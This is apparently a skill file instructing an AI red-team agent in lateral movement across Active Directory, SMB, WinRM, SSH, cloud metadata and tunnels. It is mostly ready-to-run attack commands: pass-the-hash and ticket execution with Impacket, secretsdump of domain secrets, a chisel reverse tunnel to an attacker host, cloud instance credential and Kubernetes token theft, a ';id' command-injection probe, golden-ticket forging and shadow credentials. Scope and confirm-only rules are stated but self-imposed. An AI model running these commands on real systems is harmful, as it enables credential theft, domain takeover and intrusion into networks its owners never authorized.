---
name: lateral-movement
description: Enumerate and confirm lateral-movement paths across AD, SMB, WinRM, RDP, SSH, databases, and tunnels
origin: RedteamOpencode
---

# Lateral Movement

## When to Activate

- A foothold and an in-scope credential, ticket, or reusable key are already available
- Multiple hosts, AD trusts, management services, or unreachable lab subnets require credentialed pivoting

## Tools

`run_tool nmap`, `run_tool nxc`/`run_tool netexec`, `run_tool impacket-psexec`, `run_tool impacket-wmiexec`, `run_tool impacket-atexec`, `run_tool impacket-smbexec`, `run_tool impacket-dcomexec`, `run_tool secretsdump`, `run_tool bloodhound-python`, `run_tool certipy`, `run_tool ssh`, `run_tool xfreerdp`, `run_tool redis-cli`, `run_tool mysql`, `run_tool chisel`, `run_tool socat`, `run_tool proxychains`, Metasploit (exploit phase).

## Methodology

### 1. Establish the Movement Graph
Treat the current host as the pivot origin. Resolve reachable hosts, names, domains, routes, shares, and candidate credentials; do not claim a path because a port is open.

```bash
run_tool nmap -sn IN_SCOPE_SUBNET
run_tool nmap -sV -p 22,135,445,3389,5900,5985,5986,3306,6379 HOST
run_tool nmap -p 5900 --script vnc-info HOST
run_tool ip route
run_tool arp -an
run_tool nxc smb HOST -u USER -p PASS --shares
```

Record a graph edge only after a credential or ticket is validated. Hand the actual movement chain to exploit-developer after this bounded reconnaissance.

### 2. Compare Execution Transports
Try SMB 445, WinRM 5985/5986, WMI/DCOM 135, RDP 3389, SSH 22, VNC 5900, and database pivots where a service exists. Use one-shot commands and the already discovered credential; do not brute-force during movement.

```bash
run_tool nxc smb HOST -u USER -p PASS -x 'whoami'
run_tool nxc winrm HOST -u USER -p PASS -x 'whoami'
run_tool impacket-wmiexec DOMAIN/USER:PASS@HOST
run_tool xfreerdp /v:HOST /u:USER /p:PASS +auth-only
run_tool ssh -o BatchMode=yes -i key USER@HOST 'id'
run_tool mysql -h HOST -u USER -pPASS -e 'SELECT USER();'
run_tool redis-cli -h HOST -p 6379 INFO
```

### 3. Pass Hashes and Tickets with Impacket
Validate the credential form, host, and service separately. For AD, try Pass-the-Hash or Kerberos ticket forms with the exact account material and preserve output under `$DIR/scans/`.

```bash
run_tool impacket-psexec -hashes :HASH DOMAIN/USER@HOST
run_tool impacket-psexec -k -no-pass DOMAIN/USER@HOST
run_tool impacket-wmiexec -hashes :HASH DOMAIN/USER@HOST
run_tool impacket-atexec DOMAIN/USER:PASS@HOST /system32/cmd.exe
run_tool impacket-smbexec DOMAIN/USER:PASS@HOST
run_tool impacket-dcomexec DOMAIN/USER:PASS@HOST
run_tool secretsdump 'DOMAIN/USER:PASS@DC' -outputfile $DIR/scans/ad-secrets.txt
```

Map DCSync, `AdminTo`, `ReadLAPSPassword`, write-owner, ACL, and delegation edges before selecting the next host.

### 4. Collect and Analyze AD Paths
Use BloodHound-python collection and path analysis to identify shortest privileged routes, session trust, delegation, and certificate paths. Save raw collection and the graph query output separately.

```bash
run_tool bloodhound-python -d DOMAIN -u USER -p PASS -dc-ip DC HOST
run_tool nxc smb HOST -u USER -p PASS --bloodhound 'All' --bloodhound-output $DIR/scans/bloodhound
run_tool ldapsearch -x -H ldap://DC -b 'DC=DOMAIN,DC=LAB' '(objectClass=computer)'
```

Map ADCS ESC1–ESC8 templates and ADCS remote execution through certificate enrollment; identify unconstrained, constrained, and resource-based delegation candidates without executing a ticket or certificate chain.

### 5. Stage Shares and Enumerate Remote Services
Confirm execution and share staging independently. Check writable shares, service control, task creation rights, and remote administrative shares before handing off a candidate.

```bash
run_tool nxc smb HOST -u USER -p PASS -x 'sc.exe qc SERVICE'
run_tool nxc smb HOST -u USER -p PASS -x 'schtasks /query /fo LIST /v'
run_tool nxc smb SHARE -u USER -p PASS --put "$DIR/tools/stage.txt" stage.txt
```

Use `nxc`/`netexec` for execution and share staging, and hand off remote service creation through Impacket only in the exploit-developer-owned chain.

### 6. Reuse SSH Keys and Certificate Paths
Fingerprint candidate private keys, map them to in-scope accounts, and test one host. Treat writable `authorized_keys` as a propagation candidate, but do not append a key during enumeration.

```bash
run_tool ssh-keygen -lf "$DIR/scans/candidate-key"
run_tool ssh -o BatchMode=yes -i "$DIR/scans/candidate-key" USER@HOST 'id'
run_tool nxc smb HOST -u USER -p PASS -x 'type C:\Users\USER\.ssh\authorized_keys'
run_tool certipy req -u USER@DOMAIN -p PASS -target CAHOST -ca CA-NAME
```

Map certificate enrollment, templates, and delegation to exact remote execution; exploit-developer owns certificate-to-session chains.

### 7. Pivot Through Unroutable Lab Segments
Enumerate reachable segments and candidate credentials first. Use `chisel`, `socat`, SSH local/dynamic forwarding, and `proxychains` only inside authorized lab routing; keep artifacts and tunnel logs under `$DIR/scans/`.

```bash
run_tool chisel server --reverse --port 8080
run_tool chisel client ATTACKER:8080 R:socks
run_tool socat TCP-LISTEN:8080,fork TCP:HOST:22
run_tool ssh -N -L 8080:INTERNAL:80 USER@JUMP
run_tool ssh -N -D 1080 USER@JUMP
run_tool proxychains nmap -sn INTERNAL_SUBNET
```

Enumerate the reachable segment, validate one candidate credential, and hand the actual movement chain to exploit-developer rather than silently pivoting through unrelated hosts.

### 8. Loopback and App-Server-Only Services

From a stable, evidence-backed foothold, treat services that are only reachable on the host loopback or app-server subnet—admin panels bound to loopback, internal dashboards, cloud-metadata-style endpoints, and local databases with no external exposure—as a separate pivot surface. Reach them through one already-confirmed path: a bounded `run_tool ssh -L` local port forward, a `run_tool ssh -D` SOCKS proxy through the existing session, or a server-side request primitive that was already confirmed; do not create a new pivot mechanism.

Enumerate locally listening services once through the established session and compare the saved list with the external recon. The delta is the pivot surface. Internal management/agent ports and device control APIs (RPC, telnet/SSH on the LAN segment, and VoIP control interfaces) are pivot candidates only when supported by in-scope internal evidence. Build a small explicit list (max 10 hosts) and never sweep the whole private range. After the foothold is stable and evidence-backed, test one loopback-only admin endpoint for missing authentication and one for command injection, with two bounded requests total. Record an out-of-scope observation instead of connecting to an out-of-scope host, third-party infrastructure, or a system with no engagement evidence.

```bash
mkdir -p "$DIR/scans"
printf '%s\n' 'cap: 1 local-listener enumeration, 2 loopback probes, max 10 in-scope internal hosts' > "$DIR/scans/loopback-cap.txt"
run_tool ssh -o BatchMode=yes -o ConnectTimeout=5 SESSION 'ss -lntp' > "$DIR/scans/loopback-listeners.txt" 2>&1
printf '%s\n' 'pivot_delta=compare loopback-listeners.txt with the external recon evidence before selecting targets' > "$DIR/scans/loopback-pivot-surface.txt"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 "https://HOST:PORT/admin/" -D "$DIR/scans/loopback-admin.headers" -o "$DIR/scans/loopback-admin.html"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 --data-urlencode 'target=;id' "https://HOST:PORT/diagnostic" -D "$DIR/scans/loopback-injection.headers" -o "$DIR/scans/loopback-injection.txt"
run_tool nmap -Pn -sT -p 22,23,80,443,872,9090,5060,5061 --max-hosts 10 --host-timeout 30s --max-retries 1 INTERNAL_HOST_1 INTERNAL_HOST_2 INTERNAL_HOST_3 INTERNAL_HOST_4 INTERNAL_HOST_5 INTERNAL_HOST_6 INTERNAL_HOST_7 INTERNAL_HOST_8 INTERNAL_HOST_9 INTERNAL_HOST_10 > "$DIR/scans/loopback-internal-candidates.txt" 2>&1
```

Use the existing local-forward, SOCKS, or confirmed server-side request primitive for the two probe URLs; `HOST` and `PORT` identify the selected in-scope loopback or app-server endpoint. The two loopback requests are the only endpoint probes, and the explicit host list is the only internal enumeration. If any candidate lacks in-scope evidence, record it as out of scope and do not connect.

### 9. Cloud Credential and Metadata Reuse

When a foothold holds cloud instance-profile credentials, service-account tokens, or a Kubernetes service-account JWT, treat them as a lateral edge into the cloud control plane, not just the host. Validate scope before using the credential against any other resource.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -X PUT http://169.254.169.254/latest/api/token -o "$DIR/scans/imds-token.txt"
run_tool curl -sS --connect-timeout 5 --max-time 20 -H "X-aws-ec2-metadata-token: $(cat "$DIR/scans/imds-token.txt")" http://169.254.169.254/latest/meta-data/iam/security-credentials/
run_tool curl -sS --connect-timeout 5 --max-time 20 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
run_tool cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
run_tool curl -sS -k --connect-timeout 5 --max-time 20 -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)" https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

Record the credential's actual permission scope (via a harmless `GetCallerIdentity`/`whoami`-equivalent call) before treating it as a usable edge; an instance profile with only read-only S3 access is not a lateral edge to EC2 or IAM.

### 10. RDP Session Hijack and WinRM Double-Hop

On a host with `SeTcbPrivilege`/SYSTEM context, an existing disconnected RDP session under another user is a lateral/privilege edge without a password. Separately, when a first-hop WinRM session needs to reach a second-hop resource, plain WinRM cannot forward the Kerberos ticket (the "double hop" problem) — record whether CredSSP, a registered PSSession credential, or a delegated ticket is required instead of assuming the first hop's identity travels automatically.

```bash
run_tool nxc smb HOST -u USER -p PASS -x 'query session'
run_tool nxc smb HOST -u USER -p PASS -x 'tscon SESSION_ID /dest:RDP-tcp#SESSION_NAME' # record only; requires SYSTEM, do not execute without explicit exploit-developer ownership
run_tool nxc winrm HOST -u USER -p PASS -x 'whoami /groups' # check for CredSSP-delegated vs. network-logon token
```

### 11. SSH Agent and Certificate-Authority Trust Reuse

If the foothold has a forwarded SSH agent socket or a host/user SSH-CA trust relationship, that is a movement edge distinct from a static key file.

```bash
run_tool sh -lc 'printf "%s\n" "$SSH_AUTH_SOCK"; ssh-add -l 2>/dev/null'
run_tool find / -xdev -name '*-cert.pub' -o -name 'ssh_known_hosts' 2>/dev/null
run_tool grep -R -n 'TrustedUserCAKeys\|@cert-authority' /etc/ssh 2>/dev/null
```

An accessible agent socket lets any process on the host request a signature without ever reading the private key — record which hosts accept the agent's identities before treating this as a completed pivot.

### 12. Kerberos Ticket Attacks: Roasting, Forging, and Shadow Credentials
Beyond the ticket-form checks in step 3, map the specific Kerberos abuse primitives separately since each has a different prerequisite and evidence class. Kerberoasting needs only a valid domain account and a service with an SPN; AS-REP roasting needs an account with `DONT_REQ_PREAUTH` set; golden/silver ticket forging needs the krbtgt hash or a service account hash respectively (obtained via `secretsdump` in step 3, not re-derived here); shadow-credential attacks need `GenericWrite`/`msDS-KeyCredentialLink` write access on a target object.

```bash
run_tool impacket-GetUserSPNs DOMAIN/USER:PASS@DC -outputfile "$DIR/scans/kerberoast.txt"
run_tool impacket-GetNPUsers DOMAIN/ -usersfile "$DIR/scans/candidate-users.txt" -outputfile "$DIR/scans/asrep.txt" -no-pass
run_tool impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN USER -outputfile "$DIR/scans/golden.ccache" # record only; requires krbtgt hash from an already-owned DC
run_tool certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET_ACCOUNT # msDS-KeyCredentialLink write-based shadow credential
```

Record which prerequisite (SPN presence, `DONT_REQ_PREAUTH`, krbtgt/service hash possession, or `GenericWrite` on `msDS-KeyCredentialLink`) is actually confirmed before treating a ticket-forging path as usable; offline hash cracking and ticket injection remain exploit-developer-owned.

### 13. NTLM Relay Chaining and Overpass-the-Hash
Distinguish a raw pass-the-hash (step 3) from an NTLM relay chain, which requires an active coercion or listener rather than a static credential, and from overpass-the-hash, which converts an NTLM hash into a usable Kerberos TGT without ever touching NTLM authentication on the target service.

```bash
run_tool nmap -p 445 --script smb2-security-mode HOST # signing not required = relay candidate
run_tool impacket-getST -hashes :HASH DOMAIN/USER -spn 'cifs/target.domain' DC # overpass-the-hash: NTLM hash -> Kerberos service ticket
run_tool nxc smb HOST -u USER -p PASS -M coerce_plus 2>/dev/null # record coercion primitive presence only
```

Record whether SMB signing is disabled on the relay target (a hard prerequisite `nmap` can confirm without touching credentials) and which coercion primitive (PetitPotam/PrinterBug-style) is present; the actual relay listener and coercion trigger belong to exploit-developer.

### 14. WMI Event Subscription and WinRM Session Reuse
Beyond one-shot WMI/WinRM execution (step 2), a WMI permanent event subscription or a saved/registered PSSession credential is a durable lateral primitive distinct from a single command. Enumerate existing subscriptions and registered session configurations before assuming only interactive execution is available.

```bash
run_tool nxc wmi HOST -u USER -p PASS -x 'whoami'
run_tool nxc smb HOST -u USER -p PASS -x 'powershell -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter"'
run_tool nxc smb HOST -u USER -p PASS -x 'powershell -NoProfile -Command "Get-PSSessionConfiguration"'
run_tool nxc smb HOST -u USER -p PASS -x 'winrs -r:HOST whoami' # winrs as an alternate WinRM client, different auth negotiation path than nxc
```

An existing WMI event subscription bound to a privileged account or a registered PSSession credential is a pre-established movement edge; record its owner and trigger condition rather than creating a new subscription.

### Lab objective recall closure

When the active profile lists a movement objective, requeue the exact AD path, remote transport, share staging, or tunnel workflow that already produced an edge, save one bounded result under `$DIR/scans/`, and run `python3 ./scripts/lab_objective.py snapshot "$DIR"`. Hand off `objective=<name> status=solved|requeued evidence=<path> next=<exact action>`; do not call an open port or share listing solved movement.

## References

`references/offensive-tactics/lateral-movement/smb-wmi-lateral.md`, `references/offensive-tactics/lateral-movement/rdp-lateral.md`, `references/offensive-tactics/lateral-movement/tunneling-relaying.md`, `references/active-directory/ad-enumeration.md`, `references/active-directory/kerberos-attacks.md`, `references/active-directory/adcs-attacks.md`, `references/offensive-tactics/credential-access/credential-theft-misc.md`.

## Confirm-Only Rule

Enumerate reachable segments, candidate credentials, tickets, shares, services, and one bounded movement edge at a time. The actual movement chain is owned by `exploit-developer` at `stage=vuln_confirmed`; do not spray transports, append keys, or tunnel into out-of-scope systems here.

## Budget

`--host-timeout 120s`; one transport and one credential form per host; no broad token, ticket, or tunnel spraying.
